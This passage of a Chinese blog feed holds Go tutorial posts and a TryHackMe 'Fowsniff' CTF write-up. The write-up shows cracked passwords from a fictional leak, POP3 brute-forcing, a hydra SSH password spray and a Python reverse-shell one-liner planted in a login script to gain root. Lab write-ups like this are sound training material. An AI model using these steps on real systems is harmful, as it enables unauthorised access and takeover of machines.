</code>提供了可缓冲的输出方法，它会先将数据写入到内存中，积累到了一定阈值再输出到指定的 <code>Writer</code> 中，默认缓冲区大小是 <code>4KB</code>，在文件 IO，网络 IO 的时候使用比较好。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  writer := bufio.NewWriter(os.Stdout)<br>  <span class="hljs-keyword">defer</span> writer.Flush()<br>  writer.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>go 中的格式化输出功能基本上由 <code>fmt.Printf</code> 函数提供，跟 C 语言差不多。在 <code>%</code> 与格式化动词之间加上一个空格能达到分隔符的效果。</p>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Fowsniff CTF</title>
    <link href="/2025/01/21/Fowsniff/"/>
    <url>/2025/01/21/Fowsniff/</url>
    
    <content type="html"><![CDATA[<p>最近有点偷懒了owo </p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>先用 nmap 扫一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T4 --min-rate <span class="hljs-number">1000</span> -sC -sV -p- <span class="hljs-number">10.10.108.176</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6fe50794710c00b6.png"></p><p>开放了 22、80、110、143 这4 个端口</p><p>访问一下发现了一个名叫 Fowsniff Corp 的公司，往下翻还能看见一条告示，大概意思是：@fowsniffcorp Twitter 账户被劫持了，上面可能会有敏感信息，那么我们去搜一下。</p><p><img src="https://img.dkdun.cn/v1/2025/12/24fa594eb2e4976d.png"></p><p>谷歌搜了一下，看描述找到了 twitter 发布的，点进去发现如下，有一个链接</p><p><img src="https://img.dkdun.cn/v1/2025/12/372908be9f9378be.png"></p><p>链接进去发现已经被下线了，只能看 WP 的信息了</p><p><img src="https://img.dkdun.cn/v1/2025/12/ec0ed336c8d9d0f9.png"></p><p>信息如下：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs applescript">FOWSNIFF CORP PASSWORD LEAK<br>            &#x27;&#x27;~``<br>           ( o o )<br>+<span class="hljs-comment">-----.oooO--(_)--Oooo.------+</span><br>|                            |<br>|          FOWSNIFF          |<br>|            got             |<br>|           PWN3D!!!         |<br>|                            |         <br>|       .oooO                |         <br>|        (   )   Oooo.       |         <br>+<span class="hljs-comment">---------\ (----(   )-------+</span><br>           \_)    ) /<br>                 (_/<br>FowSniff Corp got pwn3d <span class="hljs-keyword">by</span> B1gN1nj4!<br>No one <span class="hljs-keyword">is</span> safe <span class="hljs-keyword">from</span> <span class="hljs-keyword">my</span> <span class="hljs-number">1337</span> skillz!<br><br><br>mauer@fowsniff:<span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56<br>tegel@fowsniff:<span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen@fowsniff:<span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina@fowsniff:<span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd<br>mursten@fowsniff:<span class="hljs-number">0e9588</span>cb62f4b6f27e33d449e2ba0b3b<br>parede@fowsniff:<span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e<br><br>Fowsniff Corporation Passwords LEAKED!<br>FOWSNIFF CORP PASSWORD DUMP!<br><br>Here are their email passwords dumped <span class="hljs-keyword">from</span> their databases.<br>They left their pop3 server WIDE OPEN, too!<br><br>MD5 <span class="hljs-keyword">is</span> insecure, so you shouldn&#x27;t have trouble cracking them <span class="hljs-keyword">but</span> I was too lazy haha =P<br><br>l8r n00bz!<br><br>B1gN1nj4<br><br><span class="hljs-comment">-------------------------------------------------------------------------------------------------</span><br>This <span class="hljs-built_in">list</span> <span class="hljs-keyword">is</span> entirely fictional <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a Capture <span class="hljs-keyword">the</span> Flag educational challenge.<br><br>All information contained within <span class="hljs-keyword">is</span> invented solely <span class="hljs-keyword">for</span> this purpose <span class="hljs-keyword">and</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> correspond<br><span class="hljs-keyword">to</span> any <span class="hljs-built_in">real</span> persons <span class="hljs-keyword">or</span> organizations.<br><br>Any similarities <span class="hljs-keyword">to</span> actual people <span class="hljs-keyword">or</span> entities <span class="hljs-keyword">is</span> purely coincidental <span class="hljs-keyword">and</span> occurred accidentally.<br></code></pre></td></tr></table></figure><p>从上面信息中我们能发现泄露了电子邮件地址和密码 hash 值</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mauer<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:ae1644dac5b77c0cf51e0d26ad6d7e56</span><br>tegel<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:a92b8a29ef1183192e3d35187e0cfabd</span><br>mursten<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>e9588cb62f4b6f27e33d449e2ba0b3b<br>parede<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:f7fd98d380735e859f8b2ffbbede5a7e</span><br></code></pre></td></tr></table></figure><p>用 <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 解出密码</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">8a28a94a588a95b80163709ab4313aa4</span>:mailcall<br><span class="hljs-attribute">ae1644dac5b77c0cf51e0d26ad6d7e56</span>:bilbo101<br><span class="hljs-attribute">1dc352435fecca338acfd4be10984009</span>:apples01<br><span class="hljs-attribute">19f5af754c31f1e2651edde9250d69bb</span>:skyler22<br><span class="hljs-attribute">90dc16d47114aa13671c697fd506cf26</span>:scoobydoo2<br>a92b8a29ef1183192e3d35187e0cfabd：这个没找到<br><span class="hljs-attribute">0e9588cb62f4b6f27e33d449e2ba0b3b</span>:carp4ever<br><span class="hljs-attribute">4d6e42f56e127803285a0a7649b5ab11</span>:orlando12<br><span class="hljs-attribute">f7fd98d380735e859f8b2ffbbede5a7e</span>:07011972<br></code></pre></td></tr></table></figure><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h2 id="Metasploit-hydra"><a href="#Metasploit-hydra" class="headerlink" title="Metasploit &amp; hydra"></a>Metasploit &amp; hydra</h2><p>现在已经有用户名和密码了，那么可以使用 Metasploit 的 <code>pop3_login</code> 模块，使用之前找到的信息来暴力破解 POP3 </p><p><img src="https://img.dkdun.cn/v1/2025/12/9e60709cb2963e6f.png"></p><p>将用户名和密码分别添加到 usernames.txt 和 passwords.txt 里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/pop3/pop3_login<br><span class="hljs-built_in">set</span> rhost 10.10.253.104 (因为中间有事情出门了所以回来重新开的机器)<br><span class="hljs-built_in">set</span> user_file /home/butt3rf1y/usernames.txt<br><span class="hljs-built_in">set</span> pass_file /home/butt3rf1y/passwords.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/418d66c60817deff.png"></p><p>爆出来发现 1个帐户有效：<code>seina:scoobydoo2</code>（msf 好慢唉唉唉:( </p><p>登录邮箱查看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.253.104</span> <span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6aadde59584c0b29.png"></p><p>list 发现有两封邮件，查看一下。retr 1 读取第一封</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">Return</span>-Path: &lt;stone<span class="hljs-comment">@fowsniff&gt;</span><br><span class="hljs-comment">X-Original-To: seina@</span>fowsniff<br>Delivered-To: seina<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Received: by fowsniff (Postfix, from userid 1000)</span><br><span class="hljs-comment">        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)</span><br><span class="hljs-comment">To: baksteen@</span>fowsniff, mauer<span class="hljs-comment">@fowsniff, mursten@</span>fowsniff,<br>    mustikka<span class="hljs-comment">@fowsniff, parede@</span>fowsniff, sciana<span class="hljs-comment">@fowsniff, seina@</span>fowsniff,<br>    tegel<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Subject: URGENT! Security EVENT!</span><br><span class="hljs-comment">Message-Id: &lt;20180313185107.0FA3916A@</span>fowsniff&gt;<br><span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">07</span> <span class="hljs-number">-0400</span> (EDT)<br>From: stone<span class="hljs-comment">@fowsniff (stone)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Dear All,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A few days ago, a malicious actor was able to gain entry to</span><br><span class="hljs-comment">our internal email systems. The attacker was able to exploit</span><br><span class="hljs-comment">incorrectly filtered escape characters within our SQL database</span><br><span class="hljs-comment">to access our login credentials. Both the SQL and authentication</span><br><span class="hljs-comment">system used legacy methods that had not been updated in some time.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">We have been instructed to perform a complete internal system</span><br><span class="hljs-comment">overhaul. While the main systems are &quot;in the shop,&quot; we have</span><br><span class="hljs-comment">moved to this isolated, temporary server that has minimal</span><br><span class="hljs-comment">functionality.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This server is capable of sending and receiving emails, but only</span><br><span class="hljs-comment">locally. That means you can only send emails to other users, not</span><br><span class="hljs-comment">to the world wide web. You can, however, access this system via</span><br><span class="hljs-comment">the SSH protocol.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You MUST change this password as soon as possible, and you will do so under my</span><br><span class="hljs-comment">guidance. I saw the leak the attacker posted online, and I must say that your</span><br><span class="hljs-comment">passwords were not very secure.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Come see me in my office at your earliest convenience and we&#x27;ll set it up.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Thanks,</span><br><span class="hljs-comment">A.J Stone</span><br></code></pre></td></tr></table></figure><p>retr 2</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Return</span>-Path: &lt;baksteen@fowsniff&gt;<br>X-Original-<span class="hljs-keyword">To</span>: seina@fowsniff<br>Delivered-<span class="hljs-keyword">To</span>: seina@fowsniff<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">by</span> fowsniff (Postfix, <span class="hljs-keyword">from</span> userid <span class="hljs-number">1004</span>)<br>        id <span class="hljs-number">101</span>CA1AC2; Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">To:</span> seina@fowsniff<br><span class="hljs-symbol">Subject:</span> You missed out!<br>Message-Id: &lt;<span class="hljs-number">20180313185405.101</span>CA1AC2@fowsniff&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">From:</span> baksteen@fowsniff<br><br>Devin,<br><br>You should have seen the brass lay <span class="hljs-keyword">into</span> AJ today!<br>We are going <span class="hljs-keyword">to</span> be talking about this one <span class="hljs-keyword">for</span> a looooong time hahaha.<br>Who knew the regional manager had been <span class="hljs-keyword">in</span> the navy? She was swearing <span class="hljs-built_in">like</span> a sailor!<br><br>I don<span class="hljs-comment">&#x27;t know what kind of pneumonia or something you brought back with</span><br>you <span class="hljs-keyword">from</span> your camping trip, but I think I<span class="hljs-comment">&#x27;m coming down with it myself.</span><br>How <span class="hljs-type">long</span> have you been gone - a week?<br><span class="hljs-keyword">Next</span> time you<span class="hljs-comment">&#x27;re going to get sick and miss the managerial blowout of the century,</span><br>at least keep it <span class="hljs-keyword">to</span> yourself!<br><br>I<span class="hljs-comment">&#x27;m going to head home early and eat some chicken soup.</span><br>I think I just got an email <span class="hljs-keyword">from</span> Stone, too, but it<span class="hljs-comment">&#x27;s probably just some</span><br><span class="hljs-string">&quot;Let me explain the tone of my meeting with management&quot;</span> face-saving mail.<br>I<span class="hljs-comment">&#x27;ll read it when I get back.</span><br><br>Feel better,<br><br>Skyler<br><br><span class="hljs-symbol">PS:</span> Make sure you change your email password.<br>AJ had been telling us <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> that right before Captain Profanity showed up.<br></code></pre></td></tr></table></figure><p>综合来看，我们在第一封邮件里面发现了一句 “<strong>The temporary password for SSH is “<code>S1ck3nBluff+secureshell</code></strong>“”，一个临时密码</p><p>还有很多收件人“<strong>baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,mustikka@fowsniff, parede@fowsniff, sciana@fowsniff,seina@fowsniff,tegel@fowsniff</strong>”，创建一个 sshusers.txt 文件，用 hydra 来确认哪些用户没有改密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -L sshusers<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> S1ck3nBluff+secureshell ssh:<span class="hljs-comment">//10.10.253.104</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/10f2b0c72f5242b6.png"></p><p>由此确认用户 <code>bsksteen</code> 没有修改密码，现在可以直接 ssh 连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> baksteen@<span class="hljs-number">10.10.253.104</span><br></code></pre></td></tr></table></figure><p>连上之后发现 baksteen 属于 <code>users</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">find / -<span class="hljs-keyword">type</span> f -<span class="hljs-keyword">group</span> <span class="hljs-title">users</span> <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6376db1485fae637.png"></p><p>这里还有一个 shell 脚本，<code>/opt/cube/cube.sh</code>，看了一下就是登录时显示的那个图画，但是可以修改，意味着我们可以写反向 shell 了</p><h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><p>将下列 shell 写入 <code>/opt/cube/cube.sh</code> 脚本中保存</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python3 -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.14.96.245&quot;</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>退出重新登录，用 nc 监听弹 shell 的端口（我是用的 WSL，所以我直接用 Windows 的 ncat 监听的）</p><p>发现成功反弹弹了拥有 root 权限的 shell</p><p><img src="https://img.dkdun.cn/v1/2025/12/231d23c335df025c.png"></p><p>成功拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9f930db078e1a62.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-基本语法</title>
    <link href="/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>GoGoGo!</p><span id="more"></span><p>先看一个简单的代码，熟悉一下简单语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>package</strong>：声明当前文件属于哪一个包，入口文件都<strong>必须为 <code>main</code> 包</strong>，入口函数是 main 函数。</p><p><strong>import</strong>：导入关键字，fmt 是导入的包名。</p><p><strong>func</strong>：函数声明关键字。</p><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>在 go 中，程序通过将包链接在一起来构建，go 中导入的最基本单位是一个<strong>包</strong>，不是 <code>.go</code> 文件。包内共享所有变量，常量以及所有定义的类型，而且包名建议小写。</p><h2 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h2><p>go 中控制包内资源可见性有两种方法</p><ol><li>名称大写字母开头，即为<strong>公有</strong></li><li>小写或下划线开头，即为<strong>私有</strong></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">package</span> <span class="hljs-title class_">butt3r</span><br><br><span class="hljs-keyword">const</span> User = <span class="hljs-string">&quot;butt3rf1y&quot;</span><span class="hljs-comment">//公有</span><br><br><span class="hljs-keyword">const</span> passwd = <span class="hljs-number">114514</span><span class="hljs-comment">//私有</span><br></code></pre></td></tr></table></figure><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>导入包就是导入这个包的所有公有的类型&#x2F;变量&#x2F;常量</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> 包名<br></code></pre></td></tr></table></figure><p>导入单个包时</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import <span class="hljs-string">&quot;example&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example2&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时也可以用 <code>&#123;&#125;</code> 括起来</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;example1&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>如果包名重复或比较复杂，可以起一个别名</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br>e <span class="hljs-string">&quot;example&quot;</span><br>e1 <span class="hljs-string">&quot;example1&quot;</span><br><br></code></pre></td></tr></table></figure><p>还有一种匿名导入包，但是匿名导入的包无法使用，一般这么做是为了加载包下的 <code>init</code> 函数，但又不需要包中的类型，比如说注册数据库驱动</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>e <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-literal">_</span> <span class="hljs-string">&quot;mysql-driver&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>导入包后，可以通过 <code>名称.标识符</code> 去访问，比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(example.User)<br>&#125;<br></code></pre></td></tr></table></figure><p>私有类型无法访问，并且 go 不支持循环导入，不管是直接的还是间接的。例如包 A 导入了包 B，包 B 也导入了包 A，这是直接循环导入；包 A 导入了包 C，包 C 导入了包 B，包 B 又导入了包 A，这就是间接的循环导入，存在循环导入的话将会无法通过编译。</p><h2 id="内部包"><a href="#内部包" class="headerlink" title="内部包"></a>内部包</h2><p>go 中一个包内名为 <code>internal</code> 包为内部包，外部包无法访问内部包</p><h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>go 中所有内置关键字</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">break</span>        <span class="hljs-keyword">default</span>      func         <span class="hljs-keyword">interface</span>    <span class="hljs-symbol">select</span><br><span class="hljs-symbol">case</span>         <span class="hljs-symbol">defer</span>        <span class="hljs-symbol">go</span>           <span class="hljs-symbol">map</span>          <span class="hljs-symbol">struct</span><br><span class="hljs-symbol">chan</span>         <span class="hljs-symbol">else</span>         <span class="hljs-symbol">goto</span>         <span class="hljs-symbol">package</span>      <span class="hljs-symbol">switch</span><br><span class="hljs-symbol">const</span>        <span class="hljs-symbol">fallthrough</span>  <span class="hljs-symbol">if</span>           <span class="hljs-symbol">range</span>        <span class="hljs-symbol">type</span><br><span class="hljs-symbol">continue</span>     <span class="hljs-symbol">for</span>          <span class="hljs-symbol">import</span>       <span class="hljs-symbol">return</span>       <span class="hljs-symbol">var</span><br></code></pre></td></tr></table></figure><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>go 语言中支持的运算符号的优先级排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">Precedence    Operator<br>   <span class="hljs-number"> 5 </span>            *  /  %  &lt;&lt;  &gt;&gt;  &amp;  &amp;^<br>   <span class="hljs-number"> 4 </span>            +  -  |  ^<br>   <span class="hljs-number"> 3 </span>            ==  !=  &lt;  &lt;=  &gt;  &gt;=<br>   <span class="hljs-number"> 2 </span>            &amp;&amp;<br>   <span class="hljs-number"> 1 </span>            ||<br></code></pre></td></tr></table></figure><p>go 